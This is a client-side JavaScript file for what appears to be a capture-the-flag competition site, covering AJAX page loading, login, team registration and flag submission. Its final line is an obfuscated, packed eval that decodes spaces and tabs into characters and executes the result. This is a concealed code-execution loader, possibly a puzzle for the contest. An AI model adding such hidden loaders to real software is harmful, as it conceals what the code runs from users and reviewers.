function main_header(){
	$.get(
	"header.php",{ NULL:'' },function (data){
		$('#header').html(data);
	$.get(
	"main_challenge.php",{ NULL:'' },function (data){
		$('#bulletin').html(data);
	$.get(
	"main_notice.php",{ NULL:'' },function (data){
		$('#notice').html(data);
	$.get(
	"main_myrank.php",{ NULL:'' },function (data){
		$('#mylank').html(data);
	$.get(
	"main_rank.php",{ NULL:'' },function (data){
		$('#toplank').html(data);
	});});});});});
}


///////////////////////////////////main
function main(){
	if(window.location.hash){
		var hash = window.location.hash.substring(1);
		menu(hash);
	}else{
		$.get(
		"main.php",{ NULL:'' },function (data){
			$('#main').html(data);
			window.location.hash = "Main"
		}
		);
	}

main_header();




}


function menu(e){
	switch(e){
	case "YUT":
		go="yut.php";
		break;
	case "Notice":
		go="notice.php";
		break;
	case "Login":
		go="login.php";
		break;
	case "Logout":
		go="logout.php";
		break;
	case "Rules":
		go="rules.php";
		break;
	case "scene":
		go="scene.php";
		break;
	case "HallOfFame":
		go="halloffame.php";
		break;
	default:
		go="main.php";
		main_header();

		break;
	}

	$.get(
		go,{ NULL:'' },function (data){
			$('#main').html(data);
			window.location.hash = e;
		}
	);
}


function problem(category,num){
	$.get(
	"problem.php?category="+category+"&num="+num,{ NULL:'' },function (data){
		$('#toplank').html(data);
	}
	);
}


function login(){
	$.post(
		"login_check.php",{
				id:document.getElementById('id').value,
				password:document.getElementById('password').value
			 },
		function (data){
			$('#login').html(data);
		}
	);
}


function apply_button(){
	$.get(
	"apply.php",{	NULL:''
			 },
		function (data){
		$('#main').html(data);
		}
	);
}



function apply(){
	var realname = new Array();
	var n_o_m = $("#select_number_of_member option:selected").val();
	for(i=0;i<n_o_m;i++){
		realname[i] = $("#realname"+(i+1)).val();
	}
	var realname = realname.join(",");

	$.post(
	"apply_submit.php",{
				id:$("#id").val(),
				password:$('#password').val(),
				password2:$('#password2').val(),
				teamname:$('#teamname').val(),
				email:$('#email').val(),
				phone:$('#phone').val(),
				country:$('#country').val(),
				"realname":realname
			 },
		function (data){
		$('#apply').html(data);
		}
	);
}


function answer_button(){
	$.post(
	"auth_check.php",{
			category:document.getElementById('category').value,
			number:document.getElementById('number').value,
			answer:document.getElementById('answer').value
			 },
		function (data){
			$('#answer_request').html(data);
			setTimeout("clear_req()",500);
		}
	);
}

function clear_req(){
	$('#answer_request').html("");
}

function yut_kor(){
	$.get(
	"yut_kor.php",{ NULL:'' },function (data){
		$('#yutpage').html(data);
	}
	);
}

function yut_eng(){
	$.get(
	"yut_eng.php",{ NULL:'' },function (data){
		$('#yutpage').html(data);
	}
	);
}


function rule_kor(){
	$.get(
	"rule_kor.php",{ NULL:'' },function (data){
		$('#rulepage').html(data);
	}
	);
}

function rule_eng(){
	$.get(
	"rule_eng.php",{ NULL:'' },function (data){
		$('#rulepage').html(data);
	}
	);
}

function main_img(){
	if(document.getElementById('main_img')==null){
		//alert('null');
	}
	else
	{
		$(function() {
			var rollingDiv = $("#main_img");
			rollingDiv.rolling("right", 686, 400);
			rollingDiv.addRollingItem("<img src='content/images/main1.jpg'/>");
			rollingDiv.addRollingItem("<img src='content/images/main2.jpg'/>");
			rollingDiv.startRolling(50, 9000, 13);
			});
	}
}

function countryimg(country){
	country = encodeURIComponent(country);
	$('#apply_countryimg').html('<img src=./content/images/country/flags/48/'+ country +'.png>');
}

function select_number_of_member_change(e){
	var n_o_m = $(e).val();
//	var n_o_data = "";
//	for(i=0;i<n_o_m;i++){
//		n_o_data += "<tr><td><font class=\"page_subtitle\">Member "+(i+1)+" RealName</font></td><td><input type=text id=realname"+(i+1)+" style=\"width:225px;\"></td>";
//	}
//	$('#table_member_info').html(n_o_data);
	for(i=0;i<10;i++){
		if(n_o_m > i){
			$("#tr_realname"+(i+1)).show();
		}else{
			$("#tr_realname"+(i+1)).hide();
		}
	}

};

eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('12 7=["\\10\\8\\26\\21\\16\\25\\8","","\\21\\8\\20\\14\\22\\24","\\23\\27\\30\\23\\22\\10\\29\\20\\14","\\31\\10\\17\\28\\18\\24\\16\\10\\18\\17\\35\\8"];32 37(5){5=5[7[0]](/ /15,1);5=5[7[0]](/\\38/15,0);12 13=5;5=7[1];19(6=0;6<13[7[2]];6++){5=13[7[3]](6,6+1)+5};12 11=7[1];19(6=0;6<5[7[2]];6+=9){11+=36[7[4]](33(5[7[3]](6,6+9),2))};34(11)};',10,39,'|||||_0x272dx2|i|_0xfd3a|x65||x72|_0x272dx4|var|_0x272dx3|x67|g|x61|x6F|x43|for|x6E|x6C|x74|x73|x68|x63|x70|x75|x6D|x69|x62|x66|function|parseInt|eval|x64|String|c|t'.split('|'),0,{}))